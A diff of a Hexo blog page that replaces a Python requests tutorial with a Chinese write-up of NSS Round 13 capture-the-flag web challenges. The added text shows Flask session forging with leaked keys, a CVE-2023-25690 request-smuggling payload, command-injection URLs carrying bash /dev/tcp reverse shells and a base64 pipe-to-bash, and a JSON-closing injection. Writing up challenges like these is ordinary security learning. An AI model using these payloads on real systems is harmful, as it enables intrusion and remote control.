@@ -27,12 +27,12 @@
   <meta name="keywords" content="java,git,springcloud" />
 
 
-<link rel="canonical" href="https://hq185187.github.io/2023/05/03/request%E5%BA%93/">
+<link rel="canonical" href="https://hq185187.github.io/2023/06/23/NSS%20Round13/">
 
 
 
   <title>
-requests学习 |
+NSS Round 13 |
 不良人天藏星 = welcome to my blog = 不良人总舵</title>
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -60,23 +60,23 @@ requests学习 |
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">requests学习
+  <h1 itemprop="name headline">NSS Round 13
   </h1>
   
 <div class="meta">
-  <span class="item" title="创建时间：2023-05-03 14:54:19">
+  <span class="item" title="创建时间：2023-06-23 20:40:27">
     <span class="icon">
       <i class="ic i-calendar"></i>
     </span>
     <span class="text">发表于</span>
-    <time itemprop="dateCreated datePublished" datetime="2023-05-03T14:54:19+08:00">2023-05-03</time>
+    <time itemprop="dateCreated datePublished" datetime="2023-06-23T20:40:27+08:00">2023-06-23</time>
   </span>
   <span class="item" title="本文字数">
     <span class="icon">
       <i class="ic i-pen"></i>
     </span>
     <span class="text">本文字数</span>
-    <span>1.3k</span>
+    <span>2k</span>
     <span class="text">字</span>
   </span>
   <span class="item" title="阅读时长">
@@ -84,7 +84,7 @@ requests学习 |
       <i class="ic i-clock"></i>
     </span>
     <span class="text">阅读时长</span>
-    <span>1 分钟</span>
+    <span>2 分钟</span>
   </span>
 </div>
 
@@ -116,7 +116,7 @@ requests学习 |
 
       </div>
       <div id="imgs" class="pjax">
-          <img src="/assets/7.jpg">
+          <img src="/assets/23.jpg">
       </div>
     </header>
     <div id="waves">
@@ -144,7 +144,7 @@ requests学习 |
 </div>
 
     <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
-  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/05/03/request%E5%BA%93/">
+  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/06/23/NSS%20Round13/">
 
   <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="image" content="/images/avatar.jpg">
@@ -159,19 +159,50 @@ requests学习 |
   <div class="body md" itemprop="articleBody">
     
 
-    <h3 id="基本用法"><a class="markdownIt-Anchor" href="#基本用法">#</a> 基本用法</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#导入requests库</span><br><span class="line">import requests</span><br><span class="line">#发送一个get请求并得到响应</span><br><span class="line">r = requests.get(&#x27;https://www.baidu.com&#x27;)</span><br><span class="line">#查看响应对象的类型</span><br><span class="line">print(type(r))</span><br><span class="line">#查看响应状态码</span><br><span class="line">print(r.status_code)</span><br><span class="line">#查看响应内容的类型</span><br><span class="line">print(type(r.text))</span><br><span class="line">#查看响应的内容</span><br><span class="line">print(r.text)</span><br><span class="line">#查看cookies</span><br><span class="line">print(r.cookies)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="get"><a class="markdownIt-Anchor" href="#get">#</a> get</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">data = &#123;</span><br><span class="line">	&#x27;name&#x27;:&#x27;germey&#x27;,</span><br><span class="line">  &#x27;age&#x27;:22</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(&#x27;http://httpbin.org/get&#x27;,params=data)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="post传参"><a class="markdownIt-Anchor" href="#post传参">#</a> post 传参</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">data = &#123;</span><br><span class="line">  &quot;name&quot;:&quot;germey&quot;,</span><br><span class="line">  &quot;age&quot;:&quot;22&quot;</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(&#x27;http://httpbin.org/post&#x27;,data=data)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="headers设置"><a class="markdownIt-Anchor" href="#headers设置">#</a> headers 设置</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">headers = &#123;</span><br><span class="line">  &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0&#x27;,</span><br><span class="line">  &#x27;my-test&#x27;:&#x27;Hello&#x27;</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(&#x27;http://httpbin.org/get&#x27;,headers=headers)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="爬取二进制数据"><a class="markdownIt-Anchor" href="#爬取二进制数据">#</a> 爬取二进制数据</h3>
-<p>图片，音频，视频这些文件本质都是二进制码组成的，要爬它们，要拿到二进制码 (下面以百度的图标为例子)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">r=requests.get(<span class="string">&quot;https://www.baidu.com/favicon.ico&quot;</span>)  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;favicon.ico&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">f.write(r.content)</span><br></pre></td></tr></table></figure>
-<h3 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传">#</a> 文件上传</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;test1.jpg&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"><span class="comment">#以二进制方式打开当前目录的test1.jpg文件</span></span><br><span class="line">r=requests.post(<span class="string">&#x27;http://httpbin.org/post&#x27;</span>,files=files)</span><br><span class="line"><span class="comment">#进行上传</span></span><br></pre></td></tr></table></figure>
+    <h2 id="1flaskjwt"><a class="markdownIt-Anchor" href="#1flaskjwt">#</a> 1.flask?jwt?</h2>
+<p>根据题目提示可以猜出这是 flask session 伪造问题<br>
+在忘记密码的页面源代码发现 key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- secretkey: th3f1askisfunny --&gt;</span><br></pre></td></tr></table></figure>
+<p>经过简单的 fuzz 可以知道:</p>
+<ol>
+<li>admin 已经被注册</li>
+<li>只有 admin 可以拿 flag<br>
+ 抓普通用户点击拿 flag 的时候的包，开始伪造 session:</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -c &#x27;你的session&#x27; -s &#x27;th3f1askisfunny&#x27;</span><br><span class="line"></span><br><span class="line">可以看此时的_user_id是2,admin应该是1,改成1加密</span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;d58a3e83c73f903728231612f76290dfc46bf8b4ffa32c0c824e0cb6a54c459891ea2fc13e9cfbef830b8becebbd152e9b0f5039ff3a09f94be96dac53dec926&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot; -s &#x27;th3f1askisfunny&#x27;</span><br></pre></td></tr></table></figure>
+<p>将得到的新 session 改变一下得 flag<br>
+<img data-src="https://s2.loli.net/2023/06/23/wOxmQsfUvelYBhz.png" alt="屏幕截图 2023-06-23 153546.png"></p>
+<h2 id="2flaskjwthard"><a class="markdownIt-Anchor" href="#2flaskjwthard">#</a> 2.flask?jwt?(hard)</h2>
+<p>这题把 key 藏起来了，注册登录后看原代码提示 /wor 路由，访问给了登录时间，<mark> 回到登录这里把 session 随便删除一点就能看到 debug 模式回显 302, 对回显的 session 进行 base64 解码发现是进入的提示语句</mark>，于是在 /wor 路由把 session 也随便删点，可以看到 key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.secret_key = &#x27;hardgam3_C0u1d_u_f1ndM3????&#x27;;</span><br></pre></td></tr></table></figure>
+<p>之后的做法和第一题一样伪造 session 就行了</p>
+<h2 id="3信息收集"><a class="markdownIt-Anchor" href="#3信息收集">#</a> 3. 信息收集</h2>
+<p>收集到 index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;       <span class="keyword">echo</span><span class="title function_ invoke__"> file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);   &#125;   <span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   &#125;   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>dirsearch 扫到 index.php, 此时是一个任意文件读取点，通过题目提示信息收集和回显的 <code>Server: Apache/2.4.55 (Unix)</code> <br>
+ 找到了<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTIzNDU="> CVE-2023-25690</span><br>
+ 读取 <code>/usr/local/apache2/conf/httpd.conf</code> ，得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine on RewriteRule &quot;^/nssctf/(.*)&quot; &quot;http://backend-server:8080/index.php?id=$1&quot; [P] ProxyPassReverse &quot;/nssctf/&quot; &quot;http://backend-server:8080/&quot;</span><br></pre></td></tr></table></figure>
+<p>再修改姿势：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nssctf/abc%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/flag.txt</span><br></pre></td></tr></table></figure>
+<h2 id="4ez_factors"><a class="markdownIt-Anchor" href="#4ez_factors">#</a> 4.ez_factors</h2>
+<p>点击 Tool 直接跳转 factors/114514<br>
+ 此时页面也有 114514，试试命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/factors/114514|echo 666</span><br><span class="line">输出了666</span><br><span class="line">直接反弹shell,这里</span><br><span class="line">/factors/114514|bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><br><span class="line">和</span><br><span class="line">/factors/114514|bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">都会失败</span><br></pre></td></tr></table></figure>
+<p>用 base64 加密执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/factors/114514|echo [这里是反弹shellbase64加密后的内容]|base64 -d|bash</span><br></pre></td></tr></table></figure>
+<p>直接 cat /flag</p>
+<h2 id="5myweb"><a class="markdownIt-Anchor" href="#5myweb">#</a> 5.MyWeb</h2>
+<p>源码：<br>
+<img data-src="https://s2.loli.net/2023/06/23/n61TJxSUbLIyFRq.png" alt="屏幕截图 2023-06-23 192202.png"><br>
+ 题目将 <code>]</code>  替换成 <code>, $value]</code> <br>
+ 猜测 json 文件的结构是：<br>
+ <code>[1,2,3,4,...]</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">假设它的结构是[1,2,3]</span><br><span class="line">比如我们输入一个];666</span><br><span class="line">结构变成：</span><br><span class="line">[1,2,3, ];666]</span><br><span class="line">构造payload闭合[]:</span><br><span class="line"></span><br><span class="line">];%0aecho `cat /flag`;%0a[</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?mode=save&amp;&amp;value=];%0aecho `cat /flag`;%0a[</span><br><span class="line"></span><br><span class="line">?mode=read</span><br></pre></td></tr></table></figure>
+<h2 id="6timetrcer"><a class="markdownIt-Anchor" href="#6timetrcer">#</a> 6.TimeTrcer</h2>
+<p>有点难，后面看</p>
 
   </div>
 
@@ -183,7 +214,7 @@ requests学习 |
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-05-07 19:15:07" itemprop="dateModified" datetime="2023-05-07T19:15:07+08:00">2023-05-07</time>
+    <time title="修改时间：2023-06-23 20:45:50" itemprop="dateModified" datetime="2023-06-23T20:45:50+08:00">2023-06-23</time>
   </span>
 </div>
 
@@ -196,7 +227,7 @@ requests学习 |
   </li>
   <li class="link">
     <strong>本文链接：</strong>
-    <a href="https://hq185187.github.io/2023/05/03/request%E5%BA%93/" title="requests学习">https://hq185187.github.io/2023/05/03/request库/</a>
+    <a href="https://hq185187.github.io/2023/06/23/NSS%20Round13/" title="NSS Round 13">https://hq185187.github.io/2023/06/23/NSS Round13/</a>
   </li>
   <li class="license">
     <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -215,22 +246,14 @@ requests学习 |
     <div class="item left">
       
 
-  <a href="/2023/05/02/ssti-labs/" itemprop="url" rel="prev" data-background-image="&#x2F;assets&#x2F;12.jpg" title="SSTI-Labs">
+  <a href="/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="prev" data-background-image="&#x2F;assets&#x2F;1.avif" title="反弹shell学习">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>SSTI-Labs</h3>
+  <h3>反弹shell学习</h3>
   </a>
 
     </div>
     <div class="item right">
-      
-
-  <a href="/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" itemprop="url" rel="next" data-background-image="&#x2F;assets&#x2F;9.jpg" title="时间盲注">
-  <span class="type">下一篇</span>
-  <span class="category"><i class="ic i-flag"></i> SQL注入</span>
-  <h3>时间盲注</h3>
-  </a>
-
     </div>
 </div>
 
@@ -247,7 +270,7 @@ requests学习 |
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text"> 基本用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get"><span class="toc-number">2.</span> <span class="toc-text"> get</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post%E4%BC%A0%E5%8F%82"><span class="toc-number">3.</span> <span class="toc-text"> post 传参</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#headers%E8%AE%BE%E7%BD%AE"><span class="toc-number">4.</span> <span class="toc-text"> headers 设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%AC%E5%8F%96%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE"><span class="toc-number">5.</span> <span class="toc-text"> 爬取二进制数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.</span> <span class="toc-text"> 文件上传</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1flaskjwt"><span class="toc-number">1.</span> <span class="toc-text"> 1.flask?jwt?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2flaskjwthard"><span class="toc-number">2.</span> <span class="toc-text"> 2.flask?jwt?(hard)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text"> 3. 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4ez_factors"><span class="toc-number">4.</span> <span class="toc-text"> 4.ez_factors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5myweb"><span class="toc-number">5.</span> <span class="toc-text"> 5.MyWeb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6timetrcer"><span class="toc-number">6.</span> <span class="toc-text"> 6.TimeTrcer</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
       </div>
@@ -320,12 +343,10 @@ requests学习 |
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2023/05/02/ssti-labs/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -349,7 +370,7 @@ requests学习 |
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/05/10/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染">原型链污染</a></span>
+    <span><a href="/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/" title="反弹shell学习">反弹shell学习</a></span>
   </li>
 
       
@@ -358,7 +379,17 @@ requests学习 |
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞及绕过方法">命令执行漏洞及绕过方法</a></span>
+    <span><a href="/2023/04/23/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/sql/" title="分类于 SQL注入">SQL注入</a>
+</div>
+
+    <span><a href="/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/" title="Mysql主从复制">Mysql主从复制</a></span>
   </li>
 
       
@@ -376,7 +407,17 @@ requests学习 |
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/27/unserialize-labs/" title="Unserialize-labs">Unserialize-labs</a></span>
+    <span><a href="/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含及伪协议的使用">文件包含及伪协议的使用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/sql/" title="分类于 SQL注入">SQL注入</a>
+</div>
+
+    <span><a href="/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/" title="SQL注入绕过">SQL注入绕过</a></span>
   </li>
 
       
@@ -385,25 +426,17 @@ requests学习 |
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/05/02/SSTI/" title="SSTI总结">SSTI总结</a></span>
+    <span><a href="/2023/05/03/request%E5%BA%93/" title="requests学习">requests学习</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/NSSCTF/" title="分类于 NSSCTF精选">NSSCTF精选</a>
 </div>
 
-    <span><a href="/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="php反序列化漏洞学习">php反序列化漏洞学习</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="沙箱逃逸初学习">沙箱逃逸初学习</a></span>
+    <span><a href="/2023/06/04/nssctf3/" title="NSSCTF3">NSSCTF3</a></span>
   </li>
 
       
@@ -419,19 +452,9 @@ requests学习 |
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/NSSCTF/" title="分类于 NSSCTF精选">NSSCTF精选</a>
 </div>
 
-    <span><a href="/2023/05/12/nssctf2/" title="NSSCTF2">NSSCTF2</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/05/14/LitCTF2023/" title="LitCTF2023">LitCTF2023</a></span>
+    <span><a href="/2023/06/23/NSS%20Round13/" title="NSS Round 13">NSS Round 13</a></span>
   </li>
 
   </ul>
@@ -474,7 +497,7 @@ requests学习 |
   </div>
 <script data-config type="text/javascript">
   var LOCAL = {
-    path: '2023/05/03/request库/',
+    path: '2023/06/23/NSS Round13/',
     favicon: {
       show: "（●´3｀●）やれやれだぜ",
       hide: "(´Д｀)大変だ！"
